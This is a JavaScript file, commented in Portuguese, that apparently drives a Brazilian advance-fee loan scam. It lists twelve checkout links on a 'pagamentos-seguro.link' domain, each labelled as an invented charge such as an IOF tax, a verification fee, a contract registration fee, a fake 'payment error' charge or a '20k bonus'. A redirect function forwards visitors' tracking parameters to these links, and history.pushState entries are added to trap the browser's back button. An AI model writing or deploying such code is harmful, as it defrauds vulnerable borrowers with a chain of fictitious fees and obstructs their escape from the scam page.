const baseLinks = {
    up1: "https://www.pagamentos-seguro.link/checkout/38ee5ef0-a54d-433e-9ba3-1419b4673ea8", // IOF
    up2: "https://www.pagamentos-seguro.link/checkout/d825cb6b-5387-481b-ad7f-53d3dedb5be3", // Taxa de verificação de IOF
    up3: "https://www.pagamentos-seguro.link/checkout/805feed5-7140-4081-8339-ab84b82ce6dc", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://www.pagamentos-seguro.link/checkout/d99e057b-e41c-497e-ac46-853702df70b0", // NFe
    up5: "https://www.pagamentos-seguro.link/checkout/94f0a40d-c39d-430b-a2ed-5827817c8ff3", // Ativar conta
    up6: "https://www.pagamentos-seguro.link/checkout/8d1b143f-1406-4d7a-ac1f-929813bfcc0c", // Taxa de registro do contrato
    up7: "https://www.pagamentos-seguro.link/checkout/2f6e2382-cd93-4273-98f4-9a2c0df82710", // Parabéns, 20k adicional
    up8: "https://www.pagamentos-seguro.link/checkout/fdead3ed-f623-43f3-8024-6f36418a7d7e", // Erro no pagamento - 14,06
    up9: "https://www.pagamentos-seguro.link/checkout/c58a2207-96d5-4897-b7d2-e2e5b1603e04", // APP - 11,99
    up10:"https://www.pagamentos-seguro.link/checkout/a8284136-5fdc-40ce-8eb9-a5528868ce8a", // Taxa de Abertura TAC - 16,92
    up11:"https://www.pagamentos-seguro.link/checkout/e308e90f-4303-4b1e-8602-a9ee257f5727", // Taxa de Consultoria Financeira - 19,53
    up12:"https://www.pagamentos-seguro.link/checkout/cc38757f-5e71-47a5-a014-daf83a533f04" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);


